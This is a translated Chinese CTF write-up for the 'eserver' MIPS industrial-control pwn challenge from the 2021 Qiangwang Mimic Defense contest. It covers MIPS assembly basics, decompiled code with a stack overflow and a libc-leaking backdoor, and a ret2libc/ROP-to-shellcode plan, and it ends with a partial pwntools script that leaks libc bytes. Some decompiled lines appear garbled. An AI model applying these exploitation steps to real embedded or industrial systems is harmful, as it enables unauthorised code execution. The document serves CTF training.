# 2021第四届强网拟态防御积分赛工控pwn eserver WP
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
这次分享的题目是2021年第四届强网拟态积分挑战赛的一道工控方向的pwn题目，这次赛事还是挺大的，国际选手也参与进来。通过积分挑战赛拿积分，包括拟态和非拟态赛题，用积分去挑战黑盒/白盒设备题目，挑战成功即可平分百万奖金。
## mips汇编前置知识
###  mips汇编基础
**有 32 个通用寄存器，三个特殊寄存器。**  
|编号 | 名称 | 描述|  
| —— | —— |——|  
|0 | zero | 0号寄存器，始终是0；（为0提供简洁的形式）|  
|1 | $at | 保留寄存器|  
|2~3 | $v0~$v1 | values，保存表达式或函数的返回结果|  
|4~7 | $a0~a3 | arguments，函数的前4个参数|  
|8~15 | $t0~t7 | temporaries，汇编程序的临时寄存器|  
|16~23 | $s0~s7 | saved values，子函数使用时需要提前保存的值|  
|24~25 | $t8~$t9 | temporaries 临时，补充t0~t7|  
|26~27 | $k0~$k7 | 保留，中断处理函数使用|  
|28 | $gp | global pointer，全局指针|  
|29 | $sp | stack pointer，堆栈指针，指向栈顶|  
|30 | $fp | frame poniter，保存栈帧指针|  
|31 | $ra | return address，函数返回地址|  
|pc | | 程序计数器|  
|HI | | 高位、余数|  
|LO | | 低位，商|  
 **字节序**
大端序、小端序；file 指令查看 (MSB 或者 LSB)
**寻址方式**
寄存器寻址 多用于 load/store 两种
PC 寻址 多用于转移指令
立即数寻址 多用于寻找变量
###  mips汇编特点
**mips指令**
固定 4 字节长度
内存中的数据访问必须严格对齐（4byte）
流水线效应  
以下指令的，strchr 函数的参数来自 $s0 而不是 $s2
    mov $a0, $s2
    jalr strchr
    move $a0, $s0
指令格式
    R型指令    Opcode(6)   Rs(5)   Rt(5)   Rd(5)   Shamt(5)    Funct(6)
    I型指令   Opcode(6)   Rs(5)   Rt(5)   Immediate(16)
    J型指令  Opcode(6)   Address(26)
**mips常用指令**  
`i`表示立即数相关，`u`表示无符号相关。
load/store 指令  
la指令：将地址或者标签存入一个寄存器 eg:`la $t0,val_1`复制val_l的地址到$t0中，val_1是一个Label
li指令，将立即数存入通用寄存器 eg:`li $t1, 40` $t1 = 40
lw指令，从指定的地址加载一个word类型的值到一个寄存器 eg:`lw $s0, 0($sp) $s0=MEM[$sp+0]`
sw指令，将寄存器的值，存于指定的地址word类型 eg:`sw $a0, 0($sp) MEM[$sp+0] = $a0`
move指令，寄存器传值 eg：`move $t5, $t2 $t5 = $t2`  
 **算数指令**  
算术指控得所有操作都是寄存器，不能是 RAM 地址或间接寻址。且操作数大小都是 word（4byte）
    add $t0, $t1, $t2         $t0=$t1+$t2；  带符号数相加
    sub $t0, $t1, $t2          $t0=$t1-$t2；  带符号数相减
    addi $t0, $t1, 5           $t0=$t1+5；        有立即数的加法
    addu $t0, $t1, $t2          $t0=$t1+$t2     无符号数的加法
    subu $t0, $t1, $t2          $t0=$t1-$t2；  带符号数相减
    mult $t3, $t3              (HI, LO) = $t3 * $t4
    div $t5, $t6             $Hi=$t5 mod $t6
    mfhi $t0                  $t0 = $Hi
    mflo $t1                    $t1 = $Lo
**SYSCALL**
产生一个软化中断，实现系统调用；系统调用号存放在 $v0 中，参数在 $a0~$a3 中；
返回值在 $v0 中，如果出错，在 $a3 中返回错误号；在编写 shellcode 时，用到该指令机制
Write(1, “ABCn”, 5) 实现如下
    addiu $sp, $sp, -32
    li $a0, 1
    lui $t6, 0x4142
    ori $t6, $t6, 0x430a
    sw  $t6, $0($sp)
    addiu $a1, $sp, 0
    li $a2, 5
    li $v0, 4004
    syscall
**分支跳转指令**
分支跳转指令本身可以通过比较两个寄存器决定如何跳转；如果想要实现与立即数的比较跳转，需要结合类跳转指令实现
    b target                  无条件跳转到target处
    beq   $t0, $t1, target        如果"$t0 == $t1”，跳转到target
    blt $t0, $t1, target       如果“$t0 
          write(1, "Response package: ", 0x12u);
          writen(src);
          if ( strcmp((const char *)&buf, "Administrator") || tag != 287454020 )
            break;
          backdoor();
          tag = 0;
        }
      }
      while ( strcmp((const char *)&buf, "EXIT") );
      writen("Bye~");
      close(1);           
      return 0;
    }
主要漏洞在栈溢出，程序最后还关闭了便准输出流，然后还能发现当输入’Administrator’的时候会进入后门backdoor，查看后门功能：
    ssize_t backdoor()
    {
      int v1; // [sp+18h] [+18h]
      ssize_t (**v2)(int, void *, size_t); // [sp+1Ch] [+1Ch] BYREF
      write(1, "Input package: ", 0xFu);
      v1 = recvnum();
      write(1, "Response package: ", 0x12u);
      if ( v1 = 3 )
        return writen("Error!");
      v2 = &read;
      write(1, (char *)&v2 + v1, 1u);
      return write(1, &unk_1460, 1u);
    }
后门函数可以输出libc函数read地址的末0、1、2个字节偏移，从而泄露read函数libc地址，获取libc基址。
## 利用思路
程序没有开启 NX 保护，所以可以直接将 shellcode 写到栈上，并且跳转执行。但是因为 mipsel 架构流水指令集的特点，需要调用 sleep
或者其他函数将数据区刷新到当前指令区中去，才能正常执行 shellcode。
程序运行在 qemu 的 user 模式下，所以即便程序重启 libc
地址也不变，虽然后门函数只能进入一次，且一次只能泄露一个字节，但是通过多次连接可以分别泄露 libc 的各个字节。有了libc
地址之后，配合栈溢出漏洞，可以进行 ret2libc 的利用，但是 mipsel 的 gadget 不像常规 x86 架构设置寄存器那么便捷，需要配合
IDA 的mipsROP 插件慢慢找合适的 gadget。
所以整体思路是，先通过 ret2libc 调用一个 sleep 函数，刷新指令区，然后再通过 ROP 跳转到栈上的 shellcode 执行。
由于程序最后关闭了标准输出流，所以这里需要用 shellcode 拿到 shell ，然后通过在 shell
中执行命令时，将标准输出转换到标准错误输出上，来获取 flag。
## 利用过程
###  泄露libc
qemu 的 user 模式下，所以即便程序重启 libc
地址也不变，程序给了一个后门可以通过idx泄露地址的后三个字节，有了后三字节，根据偏移所以可以得到libc的地址。
    from pwn import *
    libc_base = 0x7f000000
    for x in xrange(3):
        # io = process(['qemu-mipsel', '-L', './', '-g', '1234','./eserver'])
        # io = process(['qemu-mipsel', '-L', './', './eserver'])
        io = remote('127.0.0.1', 49153)
        io.sendlineafter('Input package: ', 'Administrator')
        io.sendlineafter('Input package: ', str(x))
        io.readuntil('Response package: ')
        Abyte = u8(io.readn(1))
        libc_base += (Abyte << (8*x))
        io.close()